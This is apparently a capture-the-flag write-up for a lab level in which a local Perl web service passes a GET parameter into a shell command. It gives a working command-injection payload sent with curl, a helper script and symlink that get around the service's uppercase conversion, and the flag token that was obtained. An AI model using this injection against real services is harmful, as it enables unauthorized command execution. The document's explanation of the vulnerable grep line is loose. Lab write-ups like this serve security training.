# level12

1. Files found in `~/` :

```bash
level12.pl
```

2. Analysis of the `level12.pl` script

The service listens on `127.0.0.1:4646` and processes GET parameters `x` and `y`.
The script uses command substitution with `@output = grep /$x/, @output;` where `$x` is directly inserted into the command.
Problem : the `$x` variable is **concatenated** directly into a shell command → **shell injection possible**.

3. Exploitation

The process executes with the rights of `flag12` → the objective is to execute `/bin/getflag` on the server side and write the output to a file readable by the user.

```bash
# Create a malicious script
echo "/bin/getflag > /tmp/token" > /tmp/script.sh
chmod 777 /tmp/script.sh

# Create a symbolic link to bypass restrictions related to uppercase conversion
ln -s /tmp/script.sh /tmp/HACK

# Exploit the injection via curl
curl -Gs 'http://127.0.0.1:4646/' \
  --data-urlencode 'x=";/*/HACK;#' \
  --data-urlencode 'y='

# Retrieve the created token
cat /tmp/token
```

4. Token discovered

The token is : `g1qKMiRpXf53AWhDaU7FEkczr`
